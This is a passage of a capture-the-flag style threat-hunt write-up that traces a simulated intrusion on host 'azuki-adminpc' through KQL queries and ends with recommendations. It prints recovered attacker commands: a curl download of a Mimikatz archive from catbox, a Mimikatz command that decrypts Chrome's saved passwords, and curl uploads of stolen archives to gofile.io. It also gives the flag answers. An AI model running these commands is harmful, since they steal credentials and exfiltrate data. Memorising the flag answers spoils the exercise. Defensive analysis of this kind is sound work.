| Tax Records | 2 | Tax documents and supporting documentation |
| Business Contracts | 3 | Contract archives from 2022, 2023, and current |
| Credentials | 1 | Passwords and authentication data |

This volume of data theft aligns with the incident brief, mentioning that the competitor undercut Azuki's 6-year shipping contract by exactly 3% - the attacker had access to pricing data, contracts, and financial records that would enable precise competitive intelligence.

**MITRE ATT&CK Reference:**
- Archive Collected Data: Archive via Utility (T1560.001)

**Flag Answer:** `8`

---

### Flag 20: Credential Access - Credential Theft Tool Download

**Objective:** Identify the command used to download the credential theft tool.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= todatetime('2025-11-25T04:21:33Z')
| where ProcessCommandLine contains "catbox"
| order by TimeGenerated asc
| project TimeGenerated, AccountName, FileName, ProcessCommandLine
```

<img width="1200" alt="20" src="https://github.com/user-attachments/assets/7dfd5af4-a3d2-46c7-a810-0d346db429a4" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 5:55:34 AM |
| Command | `"curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z` |

**Analysis:**

Approximately 1.5 hours after the initial malware deployment, the attacker downloaded a second archive (`m-temp.7z`) from the same hosting infrastructure (litter.catbox.moe). The filename `m-temp` suggests this is a temporary copy of Mimikatz (`m.exe`), a well-known credential theft tool.

The attacker reused the same infrastructure and download technique:

| Flag | Time | File | Source |
|------|------|------|--------|
| Flag 5 | 4:21:11 AM | KB5044273-x64.7z | litter.catbox.moe |
| Flag 20 | 5:55:34 AM | m-temp.7z | litter.catbox.moe |

From Flag 7 results, we know the tool lifecycle:
- **5:55:34 AM** - Downloaded m-temp.7z
- **5:55:44 AM** - Extracted m.exe
- **5:57:02 AM** - Deleted m.exe (after use)

This rapid download-use-delete pattern (~90 seconds) demonstrates anti-forensic discipline, minimizing the window during which the credential theft tool exists on disk.

**MITRE ATT&CK Reference:**
- Ingress Tool Transfer (T1105)
- OS Credential Dumping (T1003)

**Flag Answer:** `"curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z`

---

### Flag 21: Credential Access - Browser Credential Theft

**Objective:** Identify the command used for browser credential theft.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= todatetime('2025-11-25T04:21:33Z')
| where ProcessCommandLine has_any ("m.exe", "mimikatz")
| order by TimeGenerated asc
| project TimeGenerated, AccountName, FileName, ProcessCommandLine
```

<img width="1200" alt="21" src="https://github.com/user-attachments/assets/c46d0803-06c0-4d8e-8707-9aa17e7c1866" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 5:55:54 AM |
| Command | `"m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit` |

**Analysis:**

The attacker used Mimikatz (`m.exe`) with the `dpapi::chrome` module to extract saved credentials from Google Chrome. The command-line arguments reveal the methodology:

| Argument | Purpose |
|----------|---------|
| `privilege::debug` | Enable debug privileges (required for DPAPI access) |
| `dpapi::chrome` | Mimikatz module for Chrome credential extraction |
| `/in:%localappdata%\Google\Chrome\User Data\Default\Login Data` | Path to Chrome's encrypted password database |
| `/unprotect` | Decrypt the credentials using DPAPI |
| `exit` | Close Mimikatz after execution |

Chrome stores saved passwords in an SQLite database (`Login Data`), encrypted with Windows DPAPI (Data Protection API). Mimikatz can decrypt these credentials when running in the context of the user who saved them, as DPAPI keys are tied to the user's Windows credentials.

**Credential Theft Timeline:**

| Timestamp | Activity |
|-----------|----------|
| 5:55:34 AM | Downloaded m-temp.7z |
| 5:55:44 AM | Extracted m.exe |
| 5:55:54 AM | Executed Chrome credential theft |
| 5:57:02 AM | Deleted m.exe |

The entire credential theft operation was completed in under 90 seconds, demonstrating operational efficiency and anti-forensic awareness.

**MITRE ATT&CK Reference:**
- Credentials from Password Stores: Credentials from Web Browsers (T1555.003)

**Flag Answer:** `"m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit`

---

### Flag 22: Exfiltration - Data Upload Command

**Objective:** Identify the command used to exfiltrate the first archive.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= todatetime('2025-11-25T04:21:33Z')
| where ProcessCommandLine has_any ("curl", "certutil", "Invoke-WebRequest", "wget")
| where ProcessCommandLine has_any ("http://", "https://", "upload", "POST")
| order by TimeGenerated asc
| project TimeGenerated, AccountName, FileName, ProcessCommandLine
```

<img width="1200" alt="22" src="https://github.com/user-attachments/assets/8425b472-3830-4a31-9f85-445135d8c44f" />

**Finding:**

| Timestamp | Archive | Destination |
|-----------|---------|-------------|
| 4:41:51 AM | credentials.tar.gz | gofile.io |
| 4:42:04 AM | quickbooks-data.tar.gz | gofile.io |
| 4:42:13 AM | banking-records.tar.gz | gofile.io |
| 4:42:23 AM | tax-documents.tar.gz | gofile.io |
| 4:42:33 AM | contracts-data.tar.gz | gofile.io |
| 4:49:19 AM | chrome-credentials.tar.gz | gofile.io |
| 5:56:50 AM | chrome-session-theft.tar.gz | gofile.io |

**Analysis:**

The attacker used `curl.exe` with form-based POST requests to exfiltrate stolen data to `gofile.io`, an anonymous file-sharing service. The command-line arguments reveal the methodology:

| Argument | Purpose |
|----------|---------|
| `-X POST` | Specify HTTP POST method |
| `-F file=@` | Form-based file upload (multipart/form-data) |
| `https://store1.gofile.io/uploadFile` | Anonymous file hosting API endpoint |

**Exfiltration Service Comparison Across Parts:**

| Part | Service | Method |
|------|---------|--------|
| Part 1 | Discord webhooks | curl.exe -F |
| Part 2 | file.io | curl.exe -F |
| Part 3 | gofile.io | curl.exe -X POST -F |

The attacker continues to rotate exfiltration infrastructure while maintaining consistent techniques (curl.exe with form uploads), demonstrating operational discipline.


**MITRE ATT&CK Reference:**
- Exfiltration Over Web Service (T1567)

**Flag Answer:** `"curl.exe" -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile`

---

### Flag 23: Exfiltration - Cloud Storage Service

**Objective:** Identify the exfiltration service domain.

**Reference:** This finding was derived from the same query results as Flag 22.

<img width="1200" alt="22" src="https://github.com/user-attachments/assets/e902c317-f9fb-4853-9f14-c3ad55a2860d" />

**Finding:**

| Field | Value |
|-------|-------|
| Service | gofile.io |
| API Endpoint | https://store1.gofile.io/uploadFile |

**Analysis:**

The attacker used `gofile.io`, an anonymous file-sharing service, to exfiltrate stolen data. This service is favored by attackers because it requires no authentication or account registration, provides temporary file hosting with self-destructing links, offers generous file size limits, uses HTTPS encryption to mask data transfers, and is a legitimate service unlikely to be blocked by corporate firewalls.

**Exfiltration Services Across All Parts:**

| Part | Service | Characteristics |
|------|---------|-----------------|
| Part 1 | Discord webhooks | Webhook-based upload, blends with collaboration traffic |
| Part 2 | file.io | Anonymous, one-time download links |
| Part 3 | gofile.io | Anonymous, temporary hosting, large file support |

The rotation of exfiltration services demonstrates the attacker's operational security awareness - by using different platforms in each phase, they reduce the risk of detection through network monitoring and make it harder for defenders to build comprehensive blocklists.

**MITRE ATT&CK Reference:**
- Exfiltration Over Web Service: Exfiltration to Cloud Storage (T1567.002)

**Flag Answer:** `gofile.io`

---

### Flag 24: Exfiltration - Destination Server

**Objective:** Identify the exfiltration server IP address.

**Query Used:**
```kql
DeviceNetworkEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= todatetime('2025-11-25T04:21:33Z')
| where RemoteUrl has "gofile"
| order by TimeGenerated asc
| project TimeGenerated, RemoteUrl, RemoteIP, InitiatingProcessFileName, InitiatingProcessCommandLine
```

<img width="1200" alt="24" src="https://github.com/user-attachments/assets/42c966fa-6aaf-4606-a623-9928738d18b6" />

**Finding:**

| Field | Value |
|-------|-------|
| Remote IP | 45.112.123.227 |
| Remote URL | store1.gofile.io |

**Analysis:**

The stolen data was exfiltrated to IP address `45.112.123.227`, which resolves to `store1.gofile.io`. This IP belongs to a cloud hosting provider that gofile.io uses for file storage.

**Network IOCs for Exfiltration:**

| Part | Service | IP Address |
|------|---------|------------|
| Part 1 | Discord webhooks | (Discord CDN IPs) |
| Part 2 | file.io | (file.io infrastructure) |
| Part 3 | gofile.io | 45.112.123.227 |

While domain-based blocking can be bypassed using IP addresses directly, having the IP provides an additional layer for network-based detection and blocking. This IP can be added to firewall blocklists and used for threat intelligence correlation to identify related attacks.

**MITRE ATT&CK Reference:**
- Exfiltration Over Web Service: Exfiltration to Cloud Storage (T1567.002)

**Flag Answer:** `45.112.123.227`

---

### Flag 25: Credential Access - Master Password Extraction

**Objective:** Identify the file containing the extracted master password.

**Query Used:**
```kql
DeviceFileEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= todatetime('2025-11-25T04:06:41Z')
| where InitiatingProcessCommandLine has_any ("password", "master", "key", "secret", "cred")
| order by TimeGenerated asc
| project TimeGenerated, ActionType, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine
```

<img width="1200" alt="25" src="https://github.com/user-attachments/assets/15885af7-57da-46a1-9641-49d3f800fa50" />

**Finding:**

| Field | Value |
|-------|-------|
| Master Password File | KeePass-Master-Password.txt |
| KeePass Database | Azuki-Passwords.kdbx |
| Archived Into | credentials.tar.gz |

**Analysis:**

The attacker discovered and exfiltrated `KeePass-Master-Password.txt`, which contains the master password for the KeePass password database (`Azuki-Passwords.kdbx`). This represents a catastrophic security failure - storing a password manager's master password in a plaintext file alongside the database completely defeats the purpose of using a password manager.

With both the KeePass database and its master password, the attacker now has access to all credentials stored within, potentially including:
- Corporate application credentials
- Network device passwords
- Cloud service accounts
- Backup server credentials
- Personal accounts

**MITRE ATT&CK Reference:**
- Credentials from Password Stores: Password Managers (T1555.005)

**Flag Answer:** `KeePass-Master-Password.txt`

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|--------|-----------|-----|----------|
| Lateral Movement | Remote Services: Remote Desktop Protocol | T1021.001 | RDP from azuki-sl to azuki-adminpc |
| Lateral Movement | Valid Accounts | T1078 | yuki.tanaka credentials |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 | Base64-encoded commands |
| Execution | User Execution | T1204 | 7z.exe archive extraction |
| Persistence | Create Account: Local Account | T1136.001 | yuki.tanaka2 backdoor |
| Defense Evasion | Obfuscated Files or Information | T1027 | Base64-encoded PowerShell |
| Defense Evasion | Masquerading | T1036.005 | KB5044273-x64.7z (fake update) |
| Defense Evasion | Deobfuscate/Decode Files | T1140 | Password-protected archives |
| Credential Access | Credentials from Password Stores: Web Browsers | T1555.003 | Chrome credential theft |
| Credential Access | Credentials from Password Stores: Password Managers | T1555.005 | KeePass database theft |
| Credential Access | Unsecured Credentials: Credentials In Files | T1552.001 | OLD-Passwords.txt, KeePass-Master-Password.txt |
| Discovery | System Owner/User Discovery | T1033 | qwinsta, quser, whoami |
| Discovery | Domain Trust Discovery | T1482 | nltest /domain_trusts |
| Discovery | System Network Connections Discovery | T1049 | netstat -ano |
| Collection | Data Staged: Local Data Staging | T1074.001 | C:\ProgramData\Microsoft\Crypto\staging |
| Collection | Automated Collection | T1119 | Robocopy.exe scripts |
| Collection | Archive Collected Data | T1560.001 | tar.exe compression |
| Exfiltration | Exfiltration Over Web Service | T1567 | curl.exe to gofile.io |
| Command and Control | Application Layer Protocol: Web Protocols | T1071.001 | Meterpreter over HTTPS |
| Command and Control | Internal Proxy | T1090.001 | Named pipe msf-pipe-5902 |

---

## Recommendations

### Immediate Actions

1. **Disable compromised accounts** - Immediately disable yuki.tanaka and remove the yuki.tanaka2 backdoor account.

2. **Isolate affected systems** - Quarantine azuki-adminpc for forensic analysis.

3. **Reset all credentials** - The KeePass database was exfiltrated with its master password. All credentials stored within must be considered compromised and rotated.

4. **Block malicious infrastructure:**
   - 45.112.123.227 (gofile.io upload server)
   - 108.181.20.36 (litter.catbox.moe)
   - Block gofile.io and catbox.moe at the network perimeter

5. **Remove persistence mechanisms:**
   - Delete backdoor account: yuki.tanaka2
   - Remove malicious files from C:\Windows\Temp\cache\
   - Clear staging directory: C:\ProgramData\Microsoft\Crypto\staging

### Long-term Improvements

1. **Password management policy** - Never store master passwords in plaintext files. Implement proper secrets management.

2. **Remove old password files** - Audit all systems for plaintext password files and remove them.

3. **Browser credential protection** - Consider enterprise password managers instead of browser-saved passwords.

4. **Endpoint detection** - Alert on Meterpreter named pipe patterns (msf-pipe-*).

5. **Outbound traffic monitoring** - Alert on uploads to anonymous file sharing services.

6. **Base64 command detection** - Alert on PowerShell executions with -EncodedCommand parameter.

---

## References

- [JADE SPIDER Threat Intel Report](https://www.notion.so/JADE-SPIDER-2b0cf57416ff80f38f39f75f670b09e2)
- [Additional Details - By Threat Hunt Organizor](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/blob/main/part-3-bridge-takeover/docs/additional-details.md)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Microsoft Defender for Endpoint Documentation](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/)
- [Summary - The AZUKI BREACH SAGA](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/blob/main/README.md)
- [Part 1 Investigation Report](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/tree/main/part-1-port-of-entry)
- [Part 2 Cargo Hold](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/tree/main/part-2-cargo-hold)
- [Part 4 Dead in the Water](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/tree/main/part-4-dead-in-the-water)
